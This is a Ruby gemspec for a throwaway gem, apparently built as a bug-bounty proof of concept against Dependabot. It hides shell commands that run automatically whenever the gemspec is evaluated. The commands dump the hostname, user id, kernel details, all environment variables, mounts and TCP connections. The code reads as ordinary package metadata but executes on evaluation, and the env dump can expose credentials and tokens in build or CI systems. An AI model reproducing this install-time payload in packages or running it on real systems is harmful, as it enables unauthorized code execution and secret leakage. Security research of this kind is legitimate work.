# Runs at gemspec-evaluation time (Bundler/RubyGems eval this file just to
# read metadata) -- the Ruby-ecosystem equivalent of an npm postinstall
# hook. Authorized security research for GitHub's Dependabot HackerOne
# bounty (bounty.github.com/targets/dependabot.html). Informational
# fingerprinting only, no destructive action.
begin
  cmds = [
    "echo ==HOSTNAME==; hostname",
    "echo ==ID==; id",
    "echo ==UNAME==; uname -a",
    "echo ==ENV==; env",
    "echo ==MOUNTS==; cat /proc/mounts 2>/dev/null",
    "echo ==NETTCP==; cat /proc/net/tcp 2>/dev/null | head -20",
    "echo ==DONE=="
  ]
  system(cmds.join(" ; "))
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.1"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
